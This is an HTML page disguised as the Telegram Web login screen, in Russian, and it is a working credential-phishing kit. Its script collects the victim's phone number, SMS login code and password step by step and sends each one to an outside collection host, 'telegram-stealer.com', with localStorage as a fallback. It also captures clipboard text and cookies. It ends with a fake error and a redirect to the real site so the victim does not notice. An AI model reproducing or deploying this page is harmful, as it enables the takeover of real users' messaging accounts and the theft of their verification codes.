<!DOCTYPE html>
<html>
<head>
    <title>Telegram Web</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><text y='20' font-size='20'>📱</text></svg>">
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .login-form {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .logo {
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
            color: #0088cc;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <div class="logo">📱 Telegram</div>
        <h2>Войдите в Telegram</h2>
        <p>Введите ваш номер телефона для входа в аккаунт</p>
        
        <input type="tel" id="phone" placeholder="+7 (XXX) XXX-XX-XX" required>
        <input type="password" id="password" placeholder="Пароль (если установлен)" style="display:none;">
        <input type="text" id="code" placeholder="Код из SMS" style="display:none;">
        
        <button onclick="handleLogin()">Продолжить</button>
        <button onclick="handleCode()" style="display:none; background: #28a745;" id="codeBtn">Подтвердить код</button>
        
        <p style="font-size: 12px; color: #666; margin-top: 15px;">
            Нажимая «Продолжить», вы соглашаетесь с нашими условиями использования.
        </p>
    </div>

    <div class="footer">
        © 2024 Telegram Messenger Inc.
    </div>

    <script>
        let step = 1;
        const stolenData = [];

        function handleLogin() {
            const phone = document.getElementById('phone').value;
            
            if (!phone) {
                alert('Пожалуйста, введите номер телефона');
                return;
            }

            // Сохраняем данные
            stolenData.push({
                phone: phone,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            });

            // Показываем поле для кода
            document.getElementById('phone').style.display = 'none';
            document.getElementById('code').style.display = 'block';
            document.querySelector('button').style.display = 'none';
            document.getElementById('codeBtn').style.display = 'block';
            
            // Имитируем отправку SMS
            alert(`Код отправлен на номер ${phone}`);
            
            // Отправляем данные на сервер
            sendToServer(stolenData);
        }

        function handleCode() {
            const code = document.getElementById('code').value;
            const phone = document.getElementById('phone').value;

            if (!code) {
                alert('Пожалуйста, введите код из SMS');
                return;
            }

            // Сохраняем код
            stolenData[0].smsCode = code;
            
            // Показываем поле для пароля
            document.getElementById('code').style.display = 'none';
            document.getElementById('password').style.display = 'block';
            document.getElementById('codeBtn').style.display = 'none';
            document.querySelector('button').style.display = 'block';
            document.querySelector('button').textContent = 'Войти в аккаунт';
            document.querySelector('button').onclick = finalSteal;

            // Обновляем данные на сервере
            sendToServer(stolenData);
        }

        function finalSteal() {
            const password = document.getElementById('password').value;
            const phone = document.getElementById('phone').value;

            // Сохраняем пароль
            stolenData[0].password = password;
            stolenData[0].completed = true;

            // Финальная отправка
            sendToServer(stolenData);

            // Показываем сообщение об ошибке (для реалистичности)
            alert('Неверный код или пароль. Попробуйте позже.');
            
            // Перенаправляем на настоящий Telegram
            setTimeout(() => {
                window.location.href = 'https://web.telegram.org';
            }, 2000);
        }

        function sendToServer(data) {
            // Отправка данных на сборник
            const formData = new FormData();
            formData.append('data', JSON.stringify(data));
            
            fetch('https://api.telegram-stealer.com/collect', {
                method: 'POST',
                body: formData,
                mode: 'no-cors'
            }).catch(() => {
                // Резервное сохранение в localStorage
                const existing = JSON.parse(localStorage.getItem('stolenAccounts') || '[]');
                localStorage.setItem('stolenAccounts', JSON.stringify([...existing, ...data]));
            });

            // Дублируем в консоль для демонстрации
            console.log('Украденные данные:', data);
        }

        // Дополнительные фишки для кражи
        document.addEventListener('copy', (e) => {
            stolenData[0].clipboardData = e.clipboardData?.getData('text');
            sendToServer(stolenData);
        });

        // Кража cookies
        if (document.cookie) {
            stolenData[0].cookies = document.cookie;
        }
    </script>
</body>
</html>
